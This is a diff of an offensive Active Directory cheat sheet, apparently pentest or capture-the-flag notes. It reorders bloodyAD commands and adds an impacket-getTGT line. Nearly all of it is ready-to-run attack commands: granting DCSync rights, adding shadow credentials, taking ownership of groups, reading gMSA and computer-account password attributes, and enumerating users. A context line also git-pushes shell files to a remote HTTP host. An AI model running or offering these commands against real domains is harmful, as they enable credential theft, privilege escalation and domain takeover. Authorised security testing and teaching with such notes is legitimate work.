@@ -368,13 +368,8 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 ## Infrastructure
 [*] Active Directory
-+---------- Search ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
-
-+---------- Get ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object MGTSVC$ --attr msDS-ManagedPassword
++---------- TGT .ccache ----------+
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 
 +---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'GROUP' 'USER'
@@ -387,6 +382,15 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
+
++---------- Get ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object MGTSVC$ | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object DC$ | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
+
++---------- Search ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
 
 +---------- Permissions ----------+
 adminCount
